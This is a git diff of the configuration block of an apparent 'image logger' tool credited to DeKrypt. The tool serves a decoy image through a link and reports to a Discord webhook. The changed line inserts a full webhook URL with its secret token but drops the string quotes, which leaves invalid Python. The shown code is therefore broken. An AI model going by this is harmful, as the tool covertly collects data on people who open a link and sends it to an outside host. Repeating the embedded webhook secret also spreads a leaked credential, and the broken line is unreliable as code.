@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1392152155221131385/hC4HZEPZZcT1TwCMThdDrFyKsA2BJXHtoaod1_HOnvHQUt-gfPNcp8bw3qCy4_-EGkhb",
+    "webhook": https://discordapp.com/api/webhooks/1392152155221131385/hC4HZEPZZcT1TwCMThdDrFyKsA2BJXHtoaod1_HOnvHQUt-gfPNcp8bw3qCy4_-EGkhb
     "image": "https://cdn.nba.com/manage/2025/04/lebron-james-dribbles.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
